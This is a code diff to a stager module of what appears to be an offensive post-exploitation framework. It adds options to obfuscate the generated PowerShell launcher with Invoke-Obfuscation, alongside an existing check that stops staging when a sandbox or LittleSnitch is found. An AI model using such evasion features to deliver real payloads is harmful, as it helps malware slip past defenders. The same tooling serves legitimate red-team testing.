@@ -45,6 +45,16 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   'True'
             },
+            'Obfuscate' : {
+                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required'      :   False,
+                'Value'         :   'False'
+            },
+            'ObfuscateCommand' : {
+                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required'      :   False,
+                'Value'         :   r'Token\All\1,Launcher\STDIN++\12467'
+            },
             'SafeChecks' : {
                 'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                 'Required'      :   True,
@@ -84,6 +94,8 @@ class Stager:
         language = self.options['Language']['Value']
         listenerName = self.options['Listener']['Value']
         base64 = self.options['Base64']['Value']
+        obfuscate = self.options['Obfuscate']['Value']
+        obfuscateCommand = self.options['ObfuscateCommand']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
@@ -93,9 +105,13 @@ class Stager:
         encode = False
         if base64.lower() == "true":
             encode = True
-        
+
+        invokeObfuscation = False
+        if obfuscate.lower() == "true":
+            invokeObfuscation = True
+
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, safeChecks=safeChecks)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=encode, obfuscate=invokeObfuscation, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, safeChecks=safeChecks)
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
